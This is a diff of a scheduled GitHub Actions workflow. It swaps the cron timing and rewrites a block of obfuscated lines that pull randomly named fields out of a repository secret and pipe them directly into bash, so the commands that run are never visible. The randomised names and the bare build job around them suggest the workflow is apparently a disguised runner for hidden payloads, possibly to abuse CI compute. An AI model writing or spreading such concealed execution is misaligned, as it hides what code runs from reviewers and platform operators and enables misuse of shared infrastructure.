@@ -2,8 +2,8 @@ name: lixiangyang3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 3/6 * * *'
-jobs:  # 4828
+    - cron: '59 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,17 +11,12 @@ jobs:  # 4828
       - uses: actions/checkout@v4
       - name: lixiangyang3456
         env:
-          ro7: ${{ secrets.ro7 }}
+          sqmyq14: ${{ secrets.sqmyq14 }}
         run: |
-          echo $ro7 | jq -r .brd6 | /bin/bash
-          echo $t7828 | jq -r .qbkyc418 | /bin/bash
-          echo $yhob166 | jq -r .c0651 | /bin/bash
-          echo $y56767 | jq -r .c85 | /bin/bash
-          echo $bnn83220 | jq -r .pny02338 | /bin/bash
-          echo $ewxp617 | jq -r .szte5 | /bin/bash
-          echo $czbom407 | jq -r .bbjkh0111 | /bin/bash
-          echo $v9237 | jq -r .mqgwl822 | /bin/bash
-          echo $bp34944 | jq -r .x61 | /bin/bash
-          echo $afb0091 | jq -r .ryqfy3 | /bin/bash
-          echo $wdj089 | jq -r .s55 | /bin/bash
+          echo $sqmyq14 | jq -r .ubdd27 | /bin/bash
+          echo $y7339 | jq -r .w7 | /bin/bash
+          echo $nlayo62 | jq -r .q723 | /bin/bash
+          echo $pg27352 | jq -r .g84 | /bin/bash
+          echo $zs9 | jq -r .crn50203 | /bin/bash
+          echo $alyco46259 | jq -r .rsiw88347 | /bin/bash
 
